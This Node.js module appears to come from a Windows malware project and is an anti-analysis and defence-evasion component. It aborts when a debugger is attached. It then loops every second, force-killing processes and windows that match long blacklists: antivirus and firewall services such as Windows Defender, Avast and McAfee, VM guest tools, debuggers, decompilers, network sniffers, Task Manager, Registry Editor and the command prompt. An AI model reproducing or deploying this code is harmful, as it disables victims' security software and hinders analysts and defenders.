const { 
    execPowerShell, 
    delay
} = require("../../utils/harware/processes.js");

const finishProcess = (pid) => {
    try {
        execPowerShell(`Stop-Process -Id ${pid} -Force`);
    } catch (error) {
        return ''
    }
}

const finishProcessesByNames = (blacklist) => {
    const processNames = execPowerShell('Get-Process | Select-Object -ExpandProperty Name').split('\r\n');

    processNames.forEach(processName => {
        if (blacklist.some(item => processName.toLowerCase().includes(item.toLowerCase()))) {
            const pidOutput = execPowerShell(`Get-Process -Name ${processName} | Select-Object -ExpandProperty Id`);
            if (pidOutput) {
                const pid = parseInt(pidOutput, 10);
                if (!isNaN(pid)) {
                    finishProcess(pid);
                }
            }
        }
    });
}

const finishProcessesByWindowsNames = (blacklist) => {
    const blacklistEscaped = blacklist.map(name => name.replace(/'/g, "''")).join(',');

    const callbackScript = `
        $blacklist = @(${blacklist.map(name => `'${name}'`).join(',')})
        $windows = Get-WmiObject -Class Win32_Process
        foreach ($window in $windows) {
            $title = $window.WindowTitle
            if ($title -ne "" -and $blacklist -contains $title.ToLower()) {
                Stop-Process -Id $window.ProcessId -Force
            }
        }
    `;

    execPowerShell(callbackScript);
}

const isDebuggerPresent = () => {
    try {
        const result = execPowerShell('[System.Diagnostics.Debugger]::IsAttached');
        return result === 'True';
    } catch (error) {
        return false;
    }
}

module.exports  = async () => {
    if (isDebuggerPresent()) {
        process.abort();
    }

    const blacklist = ['cmd','MsMpEng', 'cfp', 'AvastSvc', 'ccSvcHst','mcshield', 'vsmon', 'avgfwsvc', 'ashDisp','avp', 'MPFTray', 'Outpost', 'tinywall','glasswire', 'peerblock', 'smc', 'bdagent','oaui', 'pctfw', 'pfw', 'SPFConsole','afwServ', 'egui', 'ndf', 'avwsc','fkp', 'fsaua', 'avktray', 'rfwmain','zlclient', 'uiWinMgr', 'WRSA', 'mcuimgr','avgnt', 'sfmon', 'zatray', 'BavPro_Setup','apwiz', 'pfw7', 'jpfsrv', 'pztray','isafe', 'BullGuard', 'PSUAMain', 'SBAMSvc','nlclientapp', 'woservice', 'op_mon', 'WSClientservice','wfc', 'kicon', 'avgtray', 'npfmsg','jpf', 'WRSSSDK', 'vboxservice', 'df5serv','processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray','ida64', 'ollydbg', 'pestudio', 'vmwareuser','vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc','x32dbg', 'prl_cc', 'prl_tools', 'xenservice','qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper','joeboxserver', 'regedit', 'wireshark', 'vmusrvc','taskmgr', 'vmwareservice','httpdebuggerui','fakenet', 'fiddler', 'dumpcap'];
    const callbackBlacklist = ['debugger', 'extremedumper', 'pc-ret', 'folderchangesview', 'james','process monitor', 'protection_id', 'de4dotmodded', 'x32_dbg', 'pizza', 'fiddler','system explorer', 'mdbg', 'kdb', 'charles', 'stringdecryptor', 'phantom','windbg', 'mdb', 'harmony', 'systemexplorerservice', 'megadumper','sharpod', 'http debugger', 'dbgclr', 'x32dbg', 'sniffer', 'petools','scyllahide', 'kgdb', 'systemexplorer', 'proxifier', 'debug', 'httpdebug','httpdebugger', '0harmony', 'mitmproxy', 'ida -','simpleassembly', 'ksdumper', 'dnspy', 'x96dbg', 'de4dot', 'exeinfope','x64_dbg', 'httpanalyzer', 'strongod', 'wireshark', 'gdb', 'graywolf', 'x64dbg','ksdumper v1.1 - by equifox', 'wpe pro', 'ilspy', 'dbx', 'ollydbg', 'x64netdumper','codecracker', 'ghidra', 'titanhide', 'hxd', 'reversal','simpleassemblyexplorer', 'dojandqwklndoqwd', 'procmon64', 'process hacker',];
    
    while (true) {
        finishProcessesByNames(blacklist);
        finishProcessesByWindowsNames(callbackBlacklist);

        await delay(1000);
    };
}